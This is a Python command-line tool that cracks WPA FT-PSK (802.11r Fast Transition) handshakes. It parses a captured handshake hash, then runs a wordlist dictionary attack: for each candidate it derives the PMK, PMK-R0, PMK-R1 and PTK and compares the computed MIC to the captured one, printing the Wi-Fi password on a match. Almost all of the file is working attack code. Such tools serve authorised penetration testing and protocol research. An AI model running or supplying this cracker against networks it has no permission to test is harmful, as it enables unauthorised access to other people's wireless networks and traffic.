import hashlib, hmac, struct, argparse, sys
from Crypto.Hash import CMAC, SHA256
from Crypto.Cipher import AES


def print_banner():
	banner = '''\033[95m
	░        ░░        ░░░░░░░░░      ░░░       ░░░░      ░░░░      ░░░  ░░░░  ░
	▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒  ▒▒
	▓      ▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓       ▓▓▓  ▓▓▓▓  ▓▓  ▓▓▓▓▓▓▓▓     ▓▓▓▓
	█  ███████████  ███████████  ████  ██  ███  ███        ██  ████  ██  ███  ██
	█  ███████████  ████████████      ███  ████  ██  ████  ███      ███  ████  █
	\033[0m	by: liimbo
	'''
	print(banner)



def print_hash_info(mic, mac_ap, mac_cl, ssid, nonce_ap, nonce_cl, mdid, r0kh, r1kh):
	print("\033[92mSSID:\033[0m\n", ssid.decode())
	print("\033[92mAP MAC:\033[0m\n", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_ap))
	print("\033[92mClient:\033[0m\n", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_cl))
	print("\033[92mAP Nonce:\033[0m\n", nonce_ap.hex())
	print("\033[92mClient Nonce:\033[0m\n", nonce_cl.hex())
	print("\033[92mMobility ID:\033[0m\n", mdid.hex())
	print("\033[92mR0KH-ID:\033[0m\n", r0kh.hex())
	print("\033[92mR1KH-ID:\033[0m\n", r1kh.hex())
	print("\033[92mMIC:\033[0m\n", mic.hex() + "\n")



def get_hash(hashfile):

	# Check if the hash is in a file, and read the hash inside
	try:
		hashfile = open(sys.argv[1],'r')
		hash = hashfile.readline()
		split_hash = hash.split('*')

	# Otherwise, try to see if it's provided on the command line
	except:
		try:
			if isinstance(hashfile, str):
				hash = hashfile
				split_hash = hash.split('*')
		except:
			print("Please check hash to make sure it is correct.")
			exit()

	mic = bytes.fromhex(split_hash[2])
	mac_ap = bytes.fromhex(split_hash[3])
	mac_cl = bytes.fromhex(split_hash[4])
	ssid = bytes.fromhex(split_hash[5])
	nonce_ap = bytes.fromhex(split_hash[6])
	nonce_cl = bytes.fromhex(split_hash[7][34:98])
	eapol_client = bytes.fromhex(split_hash[7])
	mdid = bytes.fromhex(split_hash[9])
	r0kh = bytes.fromhex(split_hash[10])
	r1kh = bytes.fromhex(split_hash[11])

	return mic, mac_ap, mac_cl, ssid, nonce_ap, nonce_cl, eapol_client, mdid, r0kh, r1kh



def sha256_prf(key,A,B,size):
	blen = int(size / 8)
	num_iter = round((blen / 32))

	counter = 1
	R = b''

	for i in range(num_iter):
		hmacsha256 = hmac.new(key,counter.to_bytes(2,'little')+A+B+size.to_bytes(2,'little'),hashlib.sha256)
		counter+=1
		R = R+hmacsha256.digest()
	return R[:blen]



def crack_handshake(mic, mac_ap, mac_cl, ssid, nonce_ap, nonce_cl, eapol, mdid, r0kh, r1kh):

	if args.quiet == False:
		print_hash_info(mic, mac_ap, mac_cl, ssid, nonce_ap, nonce_cl, mdid, r0kh, r1kh)

	print("Attempting to crack...\n")

	with open(args.wordlist, 'r') as f:
		wordlist = f.readlines()
		for word in wordlist:
			password = word.strip().encode()
			
			pmk = hashlib.pbkdf2_hmac('sha1', password, ssid, 4096, 32)

			r0_key_data = sha256_prf(pmk, b"FT-R0", len(ssid).to_bytes() + ssid + mdid + len(r0kh).to_bytes() + r0kh + mac_cl, 384)
			pmkr0 = r0_key_data[:32]

			# We won't really use this, so I'm not going to spend time working on it.
			# But the names are started to be derived from the first PRF
			pmkr0_name_salt = r0_key_data[32:]
			pmkr0_name = hashlib.sha256(b"FT-R0N"+pmkr0_name_salt).digest()[:16]

			pmkr1 = sha256_prf(pmkr0, b"FT-R1", r1kh + mac_cl, 256)

			# Same idea here; may use it in the future for something, but for now ignoring
			#	(because I'm not confident these are correct)
			pmkr1_name = hashlib.sha256(b"FT-R1N"+pmkr0_name+r1kh+mac_cl).digest()[:16]

			ptk_name = hashlib.sha256(pmkr1_name + b"FT-PTKN" + nonce_cl+nonce_ap+mac_ap+mac_cl).digest()[:16]

			ptk = sha256_prf(pmkr1,b"FT-PTK",nonce_cl+nonce_ap+mac_ap+mac_cl,384)

			calc_mic = CMAC.new(ptk[:16],msg=eapol,ciphermod=AES).hexdigest()

			if args.verbose:
				LINE_UP = '\033[1A'
				LINE_CLEAR = '\x1b[2K'

				print("PMK:\t\t\t%s\n" % pmk.hex())
				print("PMK-R0:\t\t\t%s" % pmkr0.hex())
				print("PMK-R1:\t\t\t%s\n" % pmkr1.hex())
				print("KCK:\t\t\t%s" % ptk[:16].hex())
				print("KEK:\t\t\t%s" % ptk[16:32].hex())
				print("\nCalculated MIC:\t\t%s" % calc_mic)
			
				if calc_mic == mic.hex():
	                                print("\n\033[93mFOUND!\033[0m")
        	                        print("Password:\t\t", password.decode())
                	                exit()
			
				for i in range(9):
					print(LINE_UP, end=LINE_CLEAR)

			elif calc_mic == mic.hex():
				print("\n\033[93mFOUND!\033[0m")
				print("Password:\t\t", password.decode())
				exit()
		print("\n\033[93mUNABLE TO CRACK!\033[0m")
		exit()
				

if __name__ == '__main__':

	parser = argparse.ArgumentParser(prog='ft-crack.py', description='Script to crack FT-PSK handshakes for WPA. Takes in a hash on the command line or from a file. Currently supports single hash.')
	parser.add_argument('hashfile', help='File or string containing the hash to crack')
	parser.add_argument('-w','--wordlist', help='File containing the wordlist to use', required=True)
	parser.add_argument('-v','--verbose', help='Prints out addtional information while crack is running', required=False, action='store_true')
	parser.add_argument('-q','--quiet', help='Flag to disable printing of extra information', required=False, action='store_true')
	args = parser.parse_args()

	if args.quiet == False:
		print_banner()

	try:
		mic, mac_ap, mac_cl, ssid, nonce_ap, nonce_cl, eapol, mdid, r0kh, r1kh = get_hash(args.hashfile)
	except:
		print("Error getting the hash. Please make sure it's in the correct format:\n")
		print("\tWPA*04*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE_AP*EAPOL_CLIENT*MESSAGEPAIR*MD-ID*R0KH-ID*R1KH-ID")
		exit()

	crack_handshake(mic, mac_ap, mac_cl, ssid, nonce_ap, nonce_cl, eapol, mdid, r0kh, r1kh)
